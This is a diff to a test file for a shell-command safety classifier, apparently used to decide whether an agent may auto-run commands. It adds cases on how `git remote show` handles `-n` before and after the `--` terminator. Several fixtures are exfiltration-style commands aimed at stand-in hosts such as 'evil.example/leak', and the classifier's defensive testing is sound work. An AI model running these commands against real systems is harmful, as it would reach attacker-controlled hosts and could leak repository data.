@@ -424,6 +424,11 @@ describe('classifyShellCommandSafety', () => {
       'git remote show http://127.0.0.1:8973/leak',
       'git remote show ssh://evil.example/repo',
       'git remote show git@evil.example:owner/repo',
+      // A `-n` after the `--` terminator is a positional remote name, not the
+      // no-query flag, so the remote is still queried. The `-n` scan must stay
+      // on the pre-terminator slice; these pin that it does.
+      'git remote show origin -- -n',
+      'git remote show -- -n https://evil.example/leak',
     ])('routes %j to review instead of auto-running it', async (command) => {
       expect(await classifyShellCommandSafety(command)).toBe('unknown');
       expect(await isShellCommandReadOnlyAST(command)).toBe(false);
@@ -432,6 +437,11 @@ describe('classifyShellCommandSafety', () => {
     it.each([
       'git remote show -n origin',
       'git remote show -n https://evil.example/leak',
+      // `-n` is honoured at any position before `--`, so a trailing `-n`
+      // suppresses the query just as a leading one does; pin that a later
+      // leading-options-only scan cannot silently narrow it.
+      'git remote show origin -n',
+      'git remote show https://evil.example/leak -n',
       'git remote get-url origin',
     ])('keeps %j read-only', async (command) => {
       expect(await classifyShellCommandSafety(command)).toBe('read-only');
